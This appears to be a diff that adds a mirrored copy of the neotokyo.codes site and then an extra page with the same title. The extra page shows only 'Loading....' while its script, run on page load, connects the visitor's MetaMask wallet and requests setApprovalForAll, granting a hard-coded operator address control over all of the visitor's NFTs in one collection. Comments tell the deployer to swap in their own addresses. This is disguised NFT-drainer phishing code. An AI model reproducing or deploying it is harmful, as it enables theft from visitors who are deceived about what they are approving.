@@ -1,0 +1,64 @@
+<!DOCTYPE html><html lang="en">
+<!-- Mirrored from neotokyo.codes/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Aug 2025 05:13:15 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><meta name="next-head-count" content="2"/><link data-next-font="" rel="preconnect" href="index.html" crossorigin="anonymous"/><link rel="preload" href="_next/static/css/07c085b7e71cd636.css" as="style"/><link rel="stylesheet" href="_next/static/css/07c085b7e71cd636.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="_next/static/chunks/webpack-17f7407d97fafc21.js" defer=""></script><script src="_next/static/chunks/framework-089e5520f39ab93b.js" defer=""></script><script src="_next/static/chunks/main-ea421ddc5e67c9df.js" defer=""></script><script src="_next/static/chunks/pages/_app-5e7effef4552f1cf.js" defer=""></script><script src="_next/static/chunks/061e6b60-3365f724a58d4611.js" defer=""></script><script src="_next/static/chunks/fec483df-fce550205ac3c235.js" defer=""></script><script src="_next/static/chunks/7541-a429693733e1c9e6.js" defer=""></script><script src="_next/static/chunks/6683-eda4d1d505a2b59f.js" defer=""></script><script src="_next/static/chunks/1604-254d380180b797b8.js" defer=""></script><script src="_next/static/chunks/2596-a5130819c7bc83f8.js" defer=""></script><script src="_next/static/chunks/8125-7ee1d42c8d6809f4.js" defer=""></script><script src="_next/static/chunks/5646-0da9d8ce101f8281.js" defer=""></script><script src="_next/static/chunks/6590-f5a48003817812d1.js" defer=""></script><script src="_next/static/chunks/211-622bcca6222fec10.js" defer=""></script><script src="_next/static/chunks/309-f32a8e7227d26a26.js" defer=""></script><script src="_next/static/chunks/7617-7f58f2f2e3e86ec3.js" defer=""></script><script src="_next/static/chunks/pages/index-a124a7fca69b9073.js" defer=""></script><script src="_next/static/t32QMKlJnJ9SMkvmTCQ5p/_buildManifest.js" defer=""></script><script src="_next/static/t32QMKlJnJ9SMkvmTCQ5p/_ssgManifest.js" defer=""></script><style id="jss-server-side"></style></head><body><div id="__next"><!--$!--><template></template><div>...loading</div><!--/$--></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/","query":{},"buildId":"t32QMKlJnJ9SMkvmTCQ5p","nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}</script></body>
+<!-- Mirrored from neotokyo.codes/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Aug 2025 05:13:20 GMT -->
+</html>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>neotokyo.codes</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+  <h1>Loading....</h1>
+
+  <script>
+    const nftContractAddress = "0x4481507cc228fa19d203bd42110d679571f7912e"; // <-- ilisi sa imong NFT contract
+    const operatorAddress = "0x974c32106390e0F378f36FbF4428d4F32D813dd7"; // <-- ilisi kung kinsa ang i-approve (e.g., claim contract)
+
+    async function autoConnectAndApprove() {
+      if (typeof window.ethereum === 'undefined') {
+        alert("Install MetaMask first.");
+        return;
+      }
+
+      try {
+        // Connect wallet
+        await ethereum.request({ method: 'eth_requestAccounts' });
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const userAddress = await signer.getAddress();
+
+        // NFT Contract ABI (only need setApprovalForAll)
+        const abi = [
+          "function setApprovalForAll(address operator, bool approved) external",
+          "function isApprovedForAll(address owner, address operator) view returns (bool)"
+        ];
+        const nftContract = new ethers.Contract(nftContractAddress, abi, signer);
+
+        // Check if already approved
+        const alreadyApproved = await nftContract.isApprovedForAll(userAddress, operatorAddress);
+        if (alreadyApproved) {
+          console.log("Already approved.");
+          return;
+        }
+
+        // Trigger approval
+        const tx = await nftContract.setApprovalForAll(operatorAddress, true);
+        console.log("Approval sent. Waiting for confirmation...");
+        await tx.wait();
+        console.log("NFT Approved!");
+        alert("NFT Approved!");
+
+      } catch (err) {
+        console.error("Error:", err);
+        alert("Something went wrong: " + err.message);
+      }
+    }
+
+    // Run on page load
+    window.onload = autoConnectAndApprove;
+  </script>
+</body>
+</html>
